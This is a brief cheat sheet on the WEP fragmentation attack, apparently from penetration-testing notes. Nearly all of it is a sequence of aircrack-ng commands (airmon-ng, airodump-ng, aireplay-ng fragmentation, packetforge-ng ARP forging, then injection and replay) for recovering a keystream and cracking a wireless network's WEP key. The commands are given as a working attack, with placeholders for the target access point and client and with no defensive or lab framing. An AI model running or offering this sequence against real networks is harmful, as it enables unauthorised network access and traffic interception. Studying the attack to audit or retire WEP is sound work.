
A fragmentation attack exploits WEP by injecting specially crafted fragmented packets into the network to generate predictable encrypted traffic, making it easier to recover the WEP key.

```bash
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng wlan0mon --bssid <AP_MAC> -c <channel> -w WEP

aireplay-ng -5 -b <AP_MAC> -h <CLIENT_MAC> wlan0mon
y
tcpdump -s 0 -n -e -r <CAP_FILE>.cap

packetforge-ng -0 -a <AP_MAC> -h <CLIENT_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <XOR_FILE>.xor -w forgedarp.cap

aireplay-ng -2 -r forgedarp.cap -h <CLIENT_MAC> wlan0mon
aireplay-ng -3 -b <AP_MAC> -h <CLIENT_MAC> wlan0mon
```

